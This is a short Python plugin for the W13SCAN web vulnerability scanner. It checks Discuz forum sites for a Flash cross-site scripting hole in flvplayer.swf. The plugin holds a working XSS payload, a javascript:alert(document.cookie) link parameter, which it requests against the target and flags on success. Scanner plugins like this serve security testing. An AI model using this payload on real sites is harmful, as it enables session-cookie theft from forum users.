#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/20 8:45 PM
# @Author  : w8ay
# @File    : dzxss.py

import requests

from lib.output import out
from lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Dz flash xss'
    desc = '''flash xss'''

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        domain = "{}://{}/".format(p.scheme, p.netloc)
        payload = domain + "static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);"

        r = requests.get(payload, headers=headers)
        if r.status_code == 200 and 'CWS' in r.text:
            out.success(payload, self.name)
